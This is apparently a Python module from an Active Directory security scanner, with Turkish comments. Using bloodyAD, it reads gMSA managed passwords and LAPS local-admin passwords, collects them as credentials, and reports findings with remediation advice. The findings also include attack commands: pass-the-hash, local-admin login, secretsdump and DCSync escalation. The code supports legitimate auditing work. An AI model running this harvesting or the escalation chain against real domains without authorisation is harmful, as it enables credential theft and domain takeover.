"""gMSA ve LAPS parola okuma (bloodyAD).

Yetkili bir kimlik, msDS-ManagedPassword (gMSA) ya da ms-Mcs-AdmPwd / msLAPS-Password
(LAPS) özelliklerini OKUYABİLİYORSA, bu doğrudan yüksek-yetkili bir parola/NT hash
demektir — çoğu zaman yerel admin ya da servis hesabı. nxc `--laps` bazı sürümlerde
patlıyor; bu modül bloodyAD ile dener (gMSA yönetilen parolayı NT hash'e çözer).

Kimlik gerektirir; opt-in. İlgili: [[bhpath.first-degree]] (okuma hakkını ACL verir).
"""

from __future__ import annotations

import re

from ..findings import Credential, Finding, ScanReport, Severity
from ..runner import CommandResult, run, strip_dryrun
from . import bloodyAD_scan


def tool():
    return bloodyAD_scan.tool()


def scan(target, *, domain=None, username=None, password=None, nthash=None,
         use_kerberos=False, timeout=300, dry_run=False):
    if username is None or not (password or nthash or use_kerberos):
        return [CommandResult(tool="gmsa:skip", argv=[], returncode=None, stdout="",
                              stderr="", duration=0.0, error="gmsa/laps: kimlik gerekli")]
    if not tool().available:
        return [CommandResult(tool="gmsa:skip", argv=[], returncode=None, stdout="",
                              stderr="", duration=0.0, error="bloodyAD bulunamadı")]
    base = bloodyAD_scan._base_argv(target, domain, username, password, nthash,
                                    secure=True, use_kerberos=use_kerberos)
    gmsa = base + ["get", "search", "--filter",
                   "(objectClass=msDS-GroupManagedServiceAccount)",
                   "--attr", "sAMAccountName,msDS-ManagedPassword"]
    laps = base + ["get", "search", "--filter",
                   "(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))",
                   "--attr", "sAMAccountName,ms-Mcs-AdmPwd,msLAPS-Password"]
    return [run(gmsa, tool="gmsa-read", timeout=timeout, dry_run=dry_run),
            run(laps, tool="laps-read", timeout=timeout, dry_run=dry_run)]


_NT_RX = re.compile(r"(?:NT(?:LM)?|nthash)\s*[:=]\s*([0-9a-fA-F]{32})")
_SAM_RX = re.compile(r"sAMAccountName:\s*(\S+)", re.IGNORECASE)
_LAPS_RX = re.compile(r"(?:ms-Mcs-AdmPwd|msLAPS-Password):\s*(\S.*)", re.IGNORECASE)


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["gmsa"] = "\n\n".join(r.combined for r in results)
    first = results[0] if results else None
    if first and first.tool == "gmsa:skip":
        return
    target = report.target

    gmsa_out = strip_dryrun(next((r.combined for r in results if r.tool == "gmsa-read"), ""))
    laps_out = strip_dryrun(next((r.combined for r in results if r.tool == "laps-read"), ""))

    # gMSA: okunan msDS-ManagedPassword -> NT hash
    gmsa_names = _SAM_RX.findall(gmsa_out)
    gmsa_hashes = _NT_RX.findall(gmsa_out)
    if gmsa_hashes:
        for i, h in enumerate(gmsa_hashes):
            uname = gmsa_names[i] if i < len(gmsa_names) else "gMSA"
            report.add_credential(Credential(username=uname, secret=h, kind="nthash",
                                              domain=domain_of(report), source="gmsa",
                                              host=target))
        report.add(Finding(
            title=f"gMSA yönetilen parolası OKUNABİLİR — {len(gmsa_hashes)} hesap (NT hash)",
            severity=Severity.CRITICAL, target=target, source="gmsa",
            control_id="gmsa.readable", mitre="T1555",
            reference="gMSA (msDS-ManagedPassword) read",
            description="msDS-ManagedPassword okuma hakkı var; gMSA'nın NT hash'i elde edildi. "
                        "gMSA'lar sık sık yüksek yetkili servis hesaplarıdır.",
            evidence="\n".join(f"{n}" for n in gmsa_names) or f"{len(gmsa_hashes)} gMSA",
            remediation="msDS-ManagedPassword okuma hakkını (PrincipalsAllowedToRetrieve...) "
                        "yalnız gereken host'larla sınırla.",
            poc=f"bloodyAD --host {target} -d <dom> -u <u> -p <p> get search "
                "--filter '(objectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword",
            escalation="NT hash ile pass-the-hash: 'nxc smb <host> -u <gMSA> -H <nt>'; "
                       "SPN varsa targeted; yetkiliyse DCSync."))

    laps_hits = _LAPS_RX.findall(laps_out)
    if laps_hits:
        names = _SAM_RX.findall(laps_out)
        from .. import config
        ev = ("\n".join(f"{(names[i] if i < len(names) else '?')}: {pw}"
                        for i, pw in enumerate(laps_hits))
              if not config.REDACT else f"{len(laps_hits)} LAPS parolası (gizlendi)")
        for i, pw in enumerate(laps_hits):
            uname = names[i] if i < len(names) else "Administrator"
            report.add_credential(Credential(username=uname, secret=pw, kind="password",
                                              domain=domain_of(report), source="laps",
                                              host=target, admin=True))
        report.add(Finding(
            title=f"LAPS yerel admin parolası OKUNABİLİR — {len(laps_hits)} host",
            severity=Severity.CRITICAL, target=target, source="gmsa",
            control_id="laps.readable", mitre="T1555",
            reference="LAPS (ms-Mcs-AdmPwd / msLAPS-Password) read",
            description="LAPS ile yönetilen yerel yönetici parolaları okunabiliyor; "
                        "ilgili host'larda doğrudan yerel admin.",
            evidence=ev,
            remediation="LAPS parola okuma ACL'ini yalnız yetkili yönetici gruplarıyla sınırla.",
            poc=f"nxc ldap {target} -u <u> -p <p> -M laps",
            escalation="Yerel admin parolasıyla oturum: 'nxc smb <host> -u Administrator "
                       "-p <laps> --local-auth' -> secretsdump -> yanal hareket."))


def domain_of(report: ScanReport) -> str:
    return report.domain or ""


# ---------------------------------------------------------------------------
from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx.target, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash,
                use_kerberos=ctx.use_kerberos, timeout=ctx.timeout, dry_run=ctx.dry_run)


MODULE = ScanModule(
    name="gmsa",
    label="gMSA/LAPS parola okuma (bloodyAD, opt-in, kimlik gerektirir)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)
